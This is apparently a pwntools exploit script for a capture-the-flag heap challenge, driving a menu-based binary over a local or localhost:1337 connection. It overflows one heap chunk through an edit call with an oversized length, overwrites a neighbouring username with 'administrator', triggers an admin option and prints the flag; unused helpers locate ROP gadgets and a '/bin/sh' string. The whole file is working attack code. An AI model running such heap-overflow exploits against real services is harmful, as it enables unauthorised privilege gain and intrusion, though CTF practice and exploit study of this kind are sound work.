from pwn import *
from icecream import ic

elf = exe = ELF("./main")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

def alloc(ind, size, name):
    sl(b'1')
    sla("Index: ", str(ind))
    sla("Size: ", str(size))
    sla("Username: ", name)

def edit(ind, size, name):
    sl(b'2')
    sla("Index: ", str(ind))
    sla("Size: ", str(size))
    sla("Username: ", name)

def free(ind):
    sl(b'3')
    sla("Index: ", str(ind))

def list_all():
    sl(b'4')

def admin(ind):
    sl(b'5')
    sla("What's the index of your username?:", str(ind))

sl(b'a')
alloc(0, 0x20, b"A"*0x10)
alloc(1, 0x20, b"B"*0x10)
alloc(2, 0x10, b"C"*0x8)
edit(0, 100, b"........................................!.......administrator.")
# free(0)
# list_all()
admin(2)
ru("Here's the flag! ")
flag = ru("\n").strip()
ic(flag)

io.interactive()
